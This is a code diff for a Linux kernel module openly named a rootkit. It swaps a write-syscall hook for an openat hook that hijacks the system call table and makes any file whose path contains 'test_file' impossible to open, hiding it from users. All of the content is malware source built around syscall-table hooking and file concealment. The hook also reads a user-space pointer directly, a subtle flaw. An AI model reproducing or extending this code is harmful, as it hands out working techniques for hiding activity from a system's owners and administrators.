@@ -64,14 +64,19 @@ static void unhook_all(void)
     protect_memory();
 }
 
-asmlinkage int sys_write_hijack(unsigned int fd, const char __user *buf, size_t count) 
+asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int flags) 
 { 
-    int (*orig_write)(unsigned int, const char __user *, size_t) = 
-        (int (*)(unsigned int, const char __user *, size_t))(sys_call_table[__NR_write]);
+    int (*orig)(int, const char __user *, int) = 
+        (int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);
 
-    
+    const char * hidden_file = "test_file";
+
+    if (strstr(pathname, hidden_file))
+    {
+        return -1;
+    }    
  
-    return (*orig_write)(fd, buf, count);
+    return (*orig)(dirfd, pathname, flags);
 }
 
 static int __init init_rootkit(void)
@@ -82,7 +87,7 @@ static int __init init_rootkit(void)
     
     printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);
 
-    hook_syscall(__NR_write, (unsigned long)sys_write_hijack);
+    hook_syscall(__NR_openat, (unsigned long)sys_openat_hijack);
 
     return 0;
 }
